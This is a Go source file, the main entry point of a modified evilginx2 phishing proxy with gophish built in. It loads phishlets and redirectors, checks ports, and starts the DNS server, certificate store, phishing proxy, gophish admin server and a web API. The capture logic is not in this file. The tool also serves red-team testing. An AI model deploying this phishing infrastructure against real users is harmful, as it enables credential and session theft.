package main

import (
	"flag"
	"fmt"
	_log "log"
	"net"
	"os"
	"os/user"
	"path/filepath"
	"regexp"

	"github.com/caddyserver/certmagic"
	"github.com/kgretzky/evilginx2/core"
	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/gophish"
	gp_config "github.com/kgretzky/evilginx2/gophish/config"
	gp_controllers "github.com/kgretzky/evilginx2/gophish/controllers"
	gp_imap "github.com/kgretzky/evilginx2/gophish/imap"
	gp_models "github.com/kgretzky/evilginx2/gophish/models"
	"github.com/kgretzky/evilginx2/log"
	"go.uber.org/zap"
)

var phishlets_dir = flag.String("p", "", "Phishlets directory path")
var redirectors_dir = flag.String("t", "", "HTML redirector pages directory path")
var post_redirectors_dir = flag.String("u", "", "HTML post-redirector pages directory path")
var debug_log = flag.Bool("debug", false, "Enable debug output")
var developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
var cfg_dir = flag.String("c", "", "Configuration directory path")
var version_flag = flag.Bool("v", false, "Show version")

func joinPath(base_path string, rel_path string) string {
	var ret string
	if filepath.IsAbs(rel_path) {
		ret = rel_path
	} else {
		ret = filepath.Join(base_path, rel_path)
	}
	return ret
}

// checkPortAccess tests whether the process can bind to a given port.
// Returns nil if binding succeeds, or an error with an actionable message.
func checkPortAccess(bindIP string, port int, name string) error {
	addr := fmt.Sprintf("%s:%d", bindIP, port)
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		if port < 1024 {
			return fmt.Errorf("%s port %d: %v\n  Fix: run as root, use 'setcap cap_net_bind_service=+ep <binary>', or configure a port >= 1024", name, port, err)
		}
		return fmt.Errorf("%s port %d: %v", name, port, err)
	}
	ln.Close()
	return nil
}

func main() {
	flag.Parse()

	if *version_flag == true {
		log.Info("version: %s", core.VERSION)
		return
	}

	exe_path, _ := os.Executable()
	exe_dir := filepath.Dir(exe_path)

	core.Banner()

	_log.SetOutput(log.NullLogger().Writer())
	certmagic.Default.Logger = zap.NewNop()
	certmagic.DefaultACME.Logger = zap.NewNop()

	if *phishlets_dir == "" {
		// Try 1: Relative to executable
		*phishlets_dir = joinPath(exe_dir, "phishlets")
		if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
			// Try 2: Parent directory (handles build/evilginx case)
			*phishlets_dir = joinPath(exe_dir, "../phishlets")
			if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
				// Try 3: System installation path
				*phishlets_dir = "/usr/share/evilginx/phishlets/"
				if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
					log.Fatal("phishlets directory not found. Tried:\n  - %s\n  - %s\n  - %s\nPlease specify with -p flag",
						joinPath(exe_dir, "phishlets"),
						joinPath(exe_dir, "../phishlets"),
						"/usr/share/evilginx/phishlets/")
					return
				}
			}
		}
		// Clean the path to resolve .. references
		*phishlets_dir = filepath.Clean(*phishlets_dir)
	}
	if *redirectors_dir == "" {
		// Try 1: Relative to executable
		*redirectors_dir = joinPath(exe_dir, "redirectors")
		if _, err := os.Stat(*redirectors_dir); os.IsNotExist(err) {
			// Try 2: Parent directory (handles build/evilginx case)
			*redirectors_dir = joinPath(exe_dir, "../redirectors")
			if _, err := os.Stat(*redirectors_dir); os.IsNotExist(err) {
				// Try 3: System installation path
				*redirectors_dir = "/usr/share/evilginx/redirectors/"
				if _, err := os.Stat(*redirectors_dir); os.IsNotExist(err) {
					// Fallback: Create in parent directory
					*redirectors_dir = joinPath(exe_dir, "../redirectors")
				}
			}
		}
		// Clean the path to resolve .. references
		*redirectors_dir = filepath.Clean(*redirectors_dir)
	}
	if *post_redirectors_dir == "" {
		// Try 1: Relative to executable
		*post_redirectors_dir = joinPath(exe_dir, "post_redirectors")
		if _, err := os.Stat(*post_redirectors_dir); os.IsNotExist(err) {
			// Try 2: Parent directory (handles build/evilginx case)
			*post_redirectors_dir = joinPath(exe_dir, "../post_redirectors")
			if _, err := os.Stat(*post_redirectors_dir); os.IsNotExist(err) {
				// Fallback: use redirectors dir as base
				*post_redirectors_dir = *redirectors_dir
			}
		}
		*post_redirectors_dir = filepath.Clean(*post_redirectors_dir)
	}
	if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
		log.Fatal("provided phishlets directory path does not exist: %s", *phishlets_dir)
		return
	}
	if _, err := os.Stat(*redirectors_dir); os.IsNotExist(err) {
		os.MkdirAll(*redirectors_dir, os.FileMode(0700))
	}
	if _, err := os.Stat(*post_redirectors_dir); os.IsNotExist(err) {
		os.MkdirAll(*post_redirectors_dir, os.FileMode(0700))
	}

	log.DebugEnable(*debug_log)
	if *debug_log {
		log.Info("debug output enabled")
	}

	phishlets_path := *phishlets_dir
	log.Info("loading phishlets from: %s", phishlets_path)

	if *cfg_dir == "" {
		usr, err := user.Current()
		if err != nil {
			log.Fatal("%v", err)
			return
		}
		*cfg_dir = filepath.Join(usr.HomeDir, ".evilginx")
	}

	config_path := *cfg_dir
	log.Info("loading configuration from: %s", config_path)

	err := os.MkdirAll(*cfg_dir, os.FileMode(0700))
	if err != nil {
		log.Fatal("%v", err)
		return
	}

	crt_path := joinPath(*cfg_dir, "./crt")

	cfg, err := core.NewConfig(*cfg_dir, "")
	if err != nil {
		log.Fatal("config: %v", err)
		return
	}
	cfg.SetRedirectorsDir(*redirectors_dir)
	cfg.SetPostRedirectorsDir(*post_redirectors_dir)

	db, err := database.NewDatabase(filepath.Join(*cfg_dir, "data.db"))
	if err != nil {
		log.Fatal("database: %v", err)
		return
	}

	bl, err := core.NewBlacklist(filepath.Join(*cfg_dir, "blacklist.txt"))
	if err != nil {
		log.Error("blacklist: %s", err)
		return
	}

	wl, err := core.NewWhitelist(filepath.Join(*cfg_dir, "whitelist.txt"))
	if err != nil {
		log.Error("whitelist: %s", err)
		return
	}

	// Connect whitelist to blacklist
	bl.SetWhitelist(wl)

	files, err := os.ReadDir(phishlets_path)
	if err != nil {
		log.Fatal("failed to list phishlets directory '%s': %v", phishlets_path, err)
		return
	}
	for _, f := range files {
		if !f.IsDir() {
			pr := regexp.MustCompile(`([a-zA-Z0-9\-\.]*)\.yaml`)
			rpname := pr.FindStringSubmatch(f.Name())
			if len(rpname) < 2 {
				continue
			}
			pname := rpname[1]
			if pname != "" {
				pl, err := core.NewPhishlet(pname, filepath.Join(phishlets_path, f.Name()), nil, cfg)
				if err != nil {
					log.Error("failed to load phishlet '%s': %v", f.Name(), err)
					continue
				}
				cfg.AddPhishlet(pname, pl)
			}
		}
	}
	cfg.LoadSubPhishlets()
	cfg.CleanUp()

	// Pre-flight: check that we can bind to all required ports
	bindIP := cfg.GetServerBindIP()
	portChecks := []struct {
		port int
		name string
	}{
		{cfg.GetHttpPort(), "HTTP"},
		{cfg.GetHttpsPort(), "HTTPS"},
		{cfg.GetDnsPort(), "DNS"},
	}
	for _, pc := range portChecks {
		if err := checkPortAccess(bindIP, pc.port, pc.name); err != nil {
			log.Fatal("port check failed: %v", err)
			return
		}
	}

	ns, _ := core.NewNameserver(cfg)
	ns.Start()

	crt_db, err := core.NewCertDb(crt_path, cfg, ns)
	if err != nil {
		log.Fatal("certdb: %v", err)
		return
	}

	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, wl, *developer_mode)
	hp.Start()

	// Dump migrations to ~./evilginx/gophish_db to allow goose to read them from disk
	gophishMigrationsDir := filepath.Join(*cfg_dir, "gophish_db")
	os.MkdirAll(filepath.Join(gophishMigrationsDir, "db_sqlite3", "migrations"), 0755)
	
	entries, err := gophish.DBFS.ReadDir("db/db_sqlite3/migrations")
	if err == nil {
		for _, entry := range entries {
			data, err := gophish.DBFS.ReadFile("db/db_sqlite3/migrations/" + entry.Name())
			if err != nil {
				log.Error("failed to read migration file %s: %v", entry.Name(), err)
				continue
			}
			if err := os.WriteFile(filepath.Join(gophishMigrationsDir, "db_sqlite3", "migrations", entry.Name()), data, 0644); err != nil {
				log.Error("failed to write migration file %s: %v", entry.Name(), err)
			}
		}
	}

	gpConf := &gp_config.Config{
		AdminConf: gp_config.AdminServer{
			ListenURL: "127.0.0.1:3333",
			UseTLS:    false,
		},
		PhishConf: gp_config.PhishServer{
			ListenURL: "127.0.0.1:80",
			UseTLS:    false,
		},
		DBName:         "sqlite3",
		DBPath:         filepath.Join(*cfg_dir, "gophish.db"),
		MigrationsPath: filepath.Join(gophishMigrationsDir, "db_sqlite3"),
	}

	cfg.SetGoPhishIntegratedAdminUrl("http://" + gpConf.AdminConf.ListenURL)
	cfg.SetWebAdminPort(2030)

	err = gp_models.Setup(gpConf)
	if err != nil {
		log.Error("gophish models setup: %v", err)
	}

	err = gp_models.UnlockAllMailLogs()
	if err != nil {
		log.Error("gophish unlock maillogs: %v", err)
	}

	adminOptions := []gp_controllers.AdminServerOption{}
	adminServer := gp_controllers.NewAdminServer(gpConf.AdminConf, adminOptions...)
	imapMonitor := gp_imap.NewMonitor()
	
	go adminServer.Start()
	go imapMonitor.Start()

	// Initialize and start the natively integrated xverg WebAPI
	webApi := core.NewWebAPI(db, cfg, ns, hp)
	webApi.Start(cfg.GetWebAdminPort())

	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
	if err != nil {
		log.Fatal("%v", err)
		return
	}

	t.DoWork()
}
